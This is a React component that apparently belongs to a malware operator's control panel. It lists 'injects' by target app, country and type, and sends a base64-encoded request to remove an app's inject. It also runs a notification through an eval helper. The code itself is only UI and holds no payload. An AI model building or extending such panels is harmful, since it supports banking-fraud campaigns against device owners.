import React from 'react';
import SettingsContext from '../../Settings';
import $ from 'jquery';
import { isNullOrUndefined } from 'util';
import { try_eval } from '../../serviceF';

class InjectRow extends React.Component {

    YesOrNo (param) {
        return param == '1' ? <i class="fa-green far fa-check-circle"></i> : <i class="fa-red far fa-times"></i>;
    }

    OnDeleteInject() {
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {
                'params': new Buffer('{"sent_request":"remove_file_injects","app":"' + this.props.app + '"}').toString('base64')
            }
        });
        
        request.done(function(msg) {
			try {
				let result = JSON.parse(msg);
				if(!isNullOrUndefined(result.error)) {
					SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
					SettingsContext.UpdateInjectsTable();
				}
				else {
                    try_eval('$.notify("Removed inject ", "info");');
				//	SettingsContext.ShowToast('success', 'Inject removed');
					SettingsContext.UpdateInjectsTable();
					this.props.InjListForceUpdate();
				}
			}
            catch (ErrMgs) {
                //SettingsContext.ShowToastTitle('error', 'ERROR', 'Error remove inject. Look console for more details.');
               // console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    }

    render () {
        const TextAlignCenter = {
            textAlign: 'center'
        }
        const TextAlignleft = {
            textAlign: 'left',
            padding: '5px'
        }
        const MarginRight = {
            marginRight: '10px'
        }
        
        return (
            <tr>
                <td class="check-bot" style={TextAlignleft}><i class="fal fa-trash-alt" onClick={this.OnDeleteInject.bind(this)} style={MarginRight}></i></td>
                <th>{this.props.app}</th>
                <th style={TextAlignCenter}>{this.props.country}</th>
                <th style={TextAlignCenter}>{this.props.type}</th>
                
            </tr>
        );
    }
}

export default InjectRow;